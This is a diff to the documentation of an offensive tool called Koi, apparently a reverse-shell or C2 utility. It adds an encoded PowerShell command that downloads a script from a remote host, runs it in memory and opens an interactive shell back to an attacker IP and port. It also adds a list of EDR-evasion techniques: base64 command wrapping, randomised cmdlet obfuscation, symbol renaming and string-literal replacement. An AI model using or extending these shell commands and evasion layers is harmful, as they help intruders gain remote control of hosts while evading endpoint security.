@@ -38,10 +38,17 @@ The upgrade process is automatic and works as follows:
 Koi launches the following kind of command on the remote host:
 
 ```powershell
-powershell -nop -ep bypass -c "
-IEX(IWR 'http://<LOCAL_IP>:<HTTP_PORT>/c.ps1' -UseBasicParsing);
-<OBFUSCATED_FUNCTION> -RemoteIp <LOCAL_IP> -RemotePort <PORT> -Rows <ROWS> -Cols <COLS> -CommandLine powershell"
+powershell -nop -ep bypass -enc <BASE64>
 ```
+
+The base64 payload decodes to something like:
+
+```powershell
+&('Invoke-'+'Expression')(&(('{0}{1}'-f'Invoke-Web','Request') 'http://<IP>:<PORT>/c.ps1' -UseBasicParsing));
+<OBFUSCATED_FUNCTION> -RemoteIp <IP> -RemotePort <PORT> -Rows <ROWS> -Cols <COLS> -CommandLine powershell
+```
+
+The outer command uses `-EncodedCommand` so no plaintext `IEX` or `IWR` appears on the command line. The inner payload uses randomised call obfuscation so cmdlet names are never literal strings.
 
 ### More details
 
@@ -77,10 +84,10 @@ Some EDRs may still detect:
 - `Invoke-WebRequest`
 - ConPTY-related behaviours
 
-Koi currently mitigates this partially through:
+Koi mitigates this through several layers:
 
-- Function name obfuscation
-- In-memory execution
-- Temporary HTTP staging
-
-Further stealth improvements are planned in future updates.
+- **`-EncodedCommand` base64 wrapping** — `IEX`, `IWR`, the URL, and the function name are invisible on the command line.
+- **Randomised cmdlet obfuscation** — `Invoke-Expression` and `Invoke-WebRequest` are rewritten at runtime using one of three techniques (string concatenation, `-f` format string, or char-array join), chosen randomly each time.
+- **Function and symbol renaming** — the ConPtyShell PS1 script has all class names, method names, and the entry-point function renamed to random identifiers.
+- **C# string literal replacement** — known signal strings in the embedded C# source are replaced with char-array construction expressions.
+- **In-memory execution** — the script is never written to disk; it is fetched and executed directly via `IEX`.
